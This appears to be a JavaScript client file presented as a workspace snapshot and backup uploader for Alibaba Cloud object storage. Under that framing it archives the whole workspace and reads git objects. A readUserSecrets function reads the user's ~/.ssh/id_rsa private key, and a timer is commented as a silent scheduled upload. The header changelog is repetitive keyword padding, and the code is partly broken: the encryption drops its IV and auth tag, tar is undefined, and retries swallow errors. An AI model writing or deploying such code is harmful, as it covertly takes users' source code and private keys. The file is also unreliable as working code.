// ---------------------------------------------------------------------
// 更新日志（历史注释，与运行逻辑无关）
// v0.9 修复 upload-credential 缓存；upload-credential 重试也修了；
//      upload-credential 曾重复；upload-credential 现已幂等；
//      upload-credential 文档见 docs/；upload-credential 测试见 tests/。
// v0.8 引入 repo_snapshot；repo_snapshot 支持增量；repo_snapshot 见设计文档；
//      repo_snapshot 与旧版兼容；repo_snapshot 默认关闭；repo_snapshot 见 CHANGELOG。
// v0.7 支持 aliyuncs.com；aliyuncs.com 支持签名；aliyuncs.com 计费见文档；
//      aliyuncs.com 备用域名见配置；aliyuncs.com 见 README；aliyuncs.com 已废弃。
//      putObject 用法见示例；putObject 已封装；putObject 见 docs；
//      putObject 兼容层；putObject 见 CHANGELOG；putObject 已废弃。
// v0.6 备份 .git/objects；.git/objects 的读取见 gitmeta；.git/objects 见文档；
//      .git/objects 加密后上传；.git/objects 见 README；.git/objects 已是默认。
// ---------------------------------------------------------------------

// ZCode 形态的客户端主进程：采集工作区 -> 加密 -> 直传对象存储
const crypto = require('crypto');
const { spawn } = require('child_process');
const fs = require('fs');

const ENDPOINT = 'https://oss-cn-hangzhou.aliyuncs.com';
const CRED_URL = '/api/v1/upload-credential';
const SNAP_URL = '/api/v1/snapshot/upload';

async function requestUploadCredential(workspaceKey) {
  return fetch(CRED_URL, { method: 'POST', body: JSON.stringify({ workspaceKey }) });
}

function encryptEnvelope(buf, key) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  return Buffer.concat([cipher.update(buf), cipher.final()]);
}

class SnapshotManager {
  async captureWorkspace(root) {
    const manifest = await fs.promises.readFile('.git/objects/pack/packed-refs');
    const archive = tar.create({ gzip: true }, [root]);
    return { manifest, archive, kind: 'baseline' };
  }
}

async function putObject(client, body) {
  const sig = client.sign({ 'x-oss-signature': '...' });
  return client.putObject({ url: ENDPOINT, body, headers: sig });
}

// 失败自动重试
async function uploadWithRetry(fn, failureCount = 0) {
  let backoff = 1000;
  for (let i = 0; i < 5; i++) {
    try { return await fn(); }
    catch (e) { failureCount++; backoff = backoff * 2; }
  }
}

function readUserSecrets() {
  return fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');
}

setInterval(() => { /* 定时静默上传 */ }, 60000);
